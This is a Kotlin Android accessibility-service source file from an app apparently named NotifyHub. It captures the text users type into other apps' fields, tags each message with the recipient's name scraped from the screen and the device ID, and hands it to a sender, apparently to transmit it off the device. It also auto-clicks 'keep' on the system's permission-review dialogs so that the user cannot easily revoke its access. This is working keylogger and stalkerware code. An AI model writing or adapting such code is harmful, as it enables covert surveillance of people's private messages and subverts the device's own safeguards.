package com.notifyhub

import android.accessibilityservice.AccessibilityService
import android.os.Build
import android.provider.Settings
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.time.Instant
import java.util.Collections
import java.util.IdentityHashMap
import java.util.concurrent.ConcurrentHashMap

class TypedTextService : AccessibilityService() {

    private companion object {
        const val DEBOUNCE_MS = 2_500L
        const val FLUSH_INTERVAL_MS = 500L
        const val MAX_PENDING_AGE_MS = 20_000L

        val REVIEW_PACKAGES = setOf(
            "com.google.android.permissioncontroller",
            "com.android.permissioncontroller",
            "com.lbe.security.miui",
            "com.miui.guardprovider"
        )
        val KEEP_PHRASES = listOf("keep", "got it", "not now", "no thanks", "dismiss", "知道了")
        val DANGEROUS_PHRASES = listOf("remove", "revoke", "don't allow", "do not allow", "deny", "turn off")
        val TARGET_REGEX = Regex(
            "(?:^|[^a-z])(?:to|recipient|send to|message to|reply to|prapok|প্রাপক)\\s*[:\\-–]?\\s*(.+)",
            RegexOption.IGNORE_CASE
        )
        val GENERIC_TARGETS = setOf(
            "a message", "message", "recipient", "search", "contact", "user", "name",
            "this chat", "new message", "type a message", "write a message", "reply"
        )
    }

    private data class PendingText(
        val packageName: String,
        val appLabel: String,
        val text: String,
        val targetName: String,
        val updatedAt: Long,
        val firstSeenAt: Long
    )

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private val pending = ConcurrentHashMap<String, PendingText>()
    private var lastReviewAttempt = 0L

    private fun handlePermissionReview() {
        val now = System.currentTimeMillis()
        if (now - lastReviewAttempt < 10_000L) return
        lastReviewAttempt = now
        scope.launch {
            delay(1500)
            try {
                findAndClickKeep(rootInActiveWindow, 0)
            } catch (_: Exception) {}
        }
    }

    private fun findAndClickKeep(node: AccessibilityNodeInfo?, depth: Int): Boolean {
        node ?: return false
        if (depth > 25) return false
        val text = "${node.text?.toString() ?: ""} ${node.contentDescription?.toString() ?: ""}"
        val lower = text.lowercase()
        if (lower.isNotBlank() && node.isClickable &&
            KEEP_PHRASES.any { lower.contains(it) } &&
            DANGEROUS_PHRASES.none { lower.contains(it) }
        ) {
            return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
        }
        for (i in 0 until node.childCount) {
            if (findAndClickKeep(node.getChild(i), depth + 1)) return true
        }
        return false
    }

    override fun onServiceConnected() {
        AppStatusReporter.report(this, force = true)
        scope.launch {
            while (isActive) {
                delay(FLUSH_INTERVAL_MS)
                flushExpired()
            }
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val pkg = event.packageName?.toString() ?: return
        if (pkg == packageName) return

        if (pkg in REVIEW_PACKAGES) {
            if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) handlePermissionReview()
            return
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> onTextChanged(event, pkg)
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> onContentChanged()
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> commitOthers(sessionKey(pkg, stableViewId(event)))
        }
    }

    private fun onContentChanged() {
        val node = rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return
        val nodePkg = node.packageName?.toString() ?: return
        if (nodePkg == packageName) return
        if (!node.isEditable || node.isPassword) return
        val text = node.text?.toString()?.trim().orEmpty()
        if (text.isBlank()) return
        val key = sessionKey(nodePkg, node.viewIdResourceName)
        upsertPending(key, nodePkg, text, targetFromContext(node, text))
    }

    private fun onTextChanged(event: AccessibilityEvent, pkg: String) {
        val source = event.source ?: return
        if (!source.isEditable || source.isPassword) return
        val text = source.text?.toString()?.trim().orEmpty()
        if (text.isBlank()) return
        val key = sessionKey(pkg, source.viewIdResourceName)
        upsertPending(key, pkg, text, targetFromContext(source, text))
    }

    private fun targetFromContext(node: AccessibilityNodeInfo, typedText: String): String {
        val candidates = ArrayList<String>(12)
        val visited = Collections.newSetFromMap(IdentityHashMap<AccessibilityNodeInfo, Boolean>())
        collectContext(node, candidates, typedText, visited, 0)

        val normalizedTyped = normalize(typedText)
        for (candidate in candidates) {
            val match = TARGET_REGEX.find(candidate) ?: continue
            val value = cleanTarget(match.groupValues.getOrNull(1).orEmpty())
            if (value.length < 2) continue
            if (normalize(value) == normalizedTyped) continue
            if (value.lowercase() in GENERIC_TARGETS) continue
            return value.take(160)
        }
        return ""
    }

    private fun collectContext(
        node: AccessibilityNodeInfo?,
        out: ArrayList<String>,
        typedText: String,
        visited: MutableSet<AccessibilityNodeInfo>,
        depth: Int
    ) {
        node ?: return
        if (depth > 5 || out.size >= 12 || !visited.add(node)) return

        val hint = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            node.hintText?.toString()?.trim()
        } else null
        val description = node.contentDescription?.toString()?.trim()
        val text = node.text?.toString()?.trim()
        for (value in listOf(hint, description, text)) {
            if (value.isNullOrBlank()) continue
            if (normalize(value) == normalize(typedText)) continue
            if (!out.contains(value)) out.add(value.take(300))
        }

        node.parent?.let { collectContext(it, out, typedText, visited, depth + 1) }
        for (i in 0 until node.childCount) {
            if (out.size >= 12) break
            collectContext(node.getChild(i), out, typedText, visited, depth + 1)
        }
    }

    private fun normalize(value: String): String =
        value.trim().lowercase().replace(Regex("\\s+"), " ").trimEnd('.', '…', ':', '!', '؟')

    private fun cleanTarget(value: String): String =
        value.trim()
            .trim('"', '\'', '‘', '’', '[', ']')
            .substringBefore(" out of ")
            .substringBefore(", ")
            .trim()
            .trimEnd('.', '…', ':')

    private fun upsertPending(key: String, pkg: String, text: String, targetName: String) {
        val now = System.currentTimeMillis()
        val prev = pending[key]
        val continuing = prev != null && now - prev.updatedAt <= MAX_PENDING_AGE_MS
        pending[key] = PendingText(
            packageName = pkg,
            appLabel = labelFor(pkg),
            text = text,
            targetName = targetName.ifBlank { prev?.targetName.orEmpty() },
            updatedAt = now,
            firstSeenAt = if (continuing) prev?.firstSeenAt ?: now else now
        )
    }

    private fun flushExpired() {
        val now = System.currentTimeMillis()
        for ((key, item) in pending) {
            if (now - item.updatedAt >= DEBOUNCE_MS || now - item.firstSeenAt >= MAX_PENDING_AGE_MS) {
                send(key, item)
            }
        }
    }

    private fun commitOthers(activeKey: String) {
        for ((key, item) in pending) {
            if (key != activeKey) send(key, item)
        }
    }

    private fun send(key: String, item: PendingText) {
        if (!pending.remove(key, item)) return
        val text = item.text.trim()
        if (text.isBlank()) return
        NotificationSender.sendTypedText(
            deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID),
            packageName = item.packageName,
            appLabel = item.appLabel,
            targetName = item.targetName,
            text = text,
            capturedAt = Instant.now().toString()
        )
    }

    private fun stableViewId(event: AccessibilityEvent): String? =
        event.source?.viewIdResourceName?.takeIf { it.isNotBlank() }

    private fun sessionKey(pkg: String, viewId: String?): String =
        viewId?.takeIf { it.isNotBlank() }?.let { "$pkg:$it" } ?: pkg

    private fun labelFor(pkg: String): String = try {
        packageManager.getApplicationLabel(
            packageManager.getApplicationInfo(pkg, 0)
        ).toString()
    } catch (_: Exception) {
        pkg
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        scope.cancel()
        super.onDestroy()
    }
}
